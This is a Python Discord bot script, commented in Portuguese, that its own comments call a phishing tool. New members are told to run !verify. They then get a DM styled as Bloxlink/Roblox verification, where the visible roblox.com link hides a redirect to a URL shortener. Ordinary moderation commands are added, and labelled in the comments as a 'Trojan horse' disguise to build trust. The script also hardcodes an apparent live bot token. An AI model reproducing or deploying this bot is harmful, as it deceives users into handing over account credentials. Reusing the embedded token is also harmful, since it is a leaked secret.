import discord
import datetime
from discord.ext import commands
import asyncio

# --- CONFIGURAÇÃO ---
TOKEN = 'MTQ0MjE2NDc4Mzc2MjkwMzI2MQ.GzT8q3.5pU8FsXA6VVCvP062UKGQy7bqTshh_O1LrGLdY' 
prefix = '!'

# Intents necessários para todas as funções (Moderação + Phishing)
intents = discord.Intents.default()
intents.members = True
intents.message_content = True 

client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    print(f'✅ Logged in as {client.user}')
    print('✅ Sistema de Moderação e Verificação Ativo.')

@client.event
async def on_member_join(member):
    # Mensagem automática de boas-vindas para atrair a vítima
    channel = discord.utils.get(member.guild.channels, name='welcome')
    if channel:
        await channel.send(f"Welcome to the server, {member.mention}! Please use !verify to access the rest of the channels.")

# --- COMANDO DE PHISHING (O Isco) ---
@client.command()
async def verify(ctx):
    author = ctx.message.author

    # Embed de Phishing com o link mascarado do governo chileno
    test_e = discord.Embed(colour=discord.Colour(0xff6464))
    test_e.set_author(name="You must be new!")
    test_e.add_field(
        name="Please verify your account with Bloxlink for verify!",
        value="[https://www.roblox.com/verify](https://h7.cl/1hemo)", 
        inline=False
    )
    test_e.set_footer(
        icon_url="https://cdn.discordapp.com/avatars/865378528887308318/78776d34d943cc8c1501ae365f017c1c.png?size=128",
        text="Bloxlink"
    )
    test_e.set_image(url="https://images-ext-2.discordapp.net/external/KHgnlQrg5kVthDcnpe1wcYzkYplbF_e1WQwlQS58XbY/https/t2.rbxcdn.com/73def03f458ec62be70418f8e9a35da5?width=400&height=225")
    test_e.timestamp = datetime.datetime.utcnow()

    draw = discord.Embed(colour=discord.Colour(0xff6464))
    draw.add_field(name="Verification", value=f'I have sent you a link to verify in your direct messages {ctx.author.mention}', inline=False)

    try:
        await author.send(embed=test_e)
        await ctx.send(embed=draw)
    except discord.Forbidden:
        await ctx.send("❌ Erro: Não consigo enviar DMs para este utilizador.")

# --- COMANDOS DE "CAVALO DE TROIA" (Moderação Legítima) ---
@client.command()
@commands.is_owner()
async def make_server(ctx):
    # Este comando cria toda a estrutura do servidor para ganhar confiança
    guild = ctx.guild
    categories = ['General', 'Announcements', 'Moderation', 'Bot Commands']
    for cat_name in categories:
        category = await guild.create_category(cat_name)
        await category.create_text_channel('chat')
        await category.create_voice_channel('voice')
    
    await ctx.send("✅ Server setup completed successfully! (Disguise Mode)")

@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f"👢 {member.mention} kicked.")

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"🔨 {member.mention} banned.")

@client.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"🧹 {amount} messages deleted.")

@client.command()
async def ping(ctx):
    await ctx.send(f"🏓 Pong! {round(client.latency * 1000)}ms")

@client.command()
async def say(ctx, *, message):
    await ctx.send(message)

client.run(TOKEN)
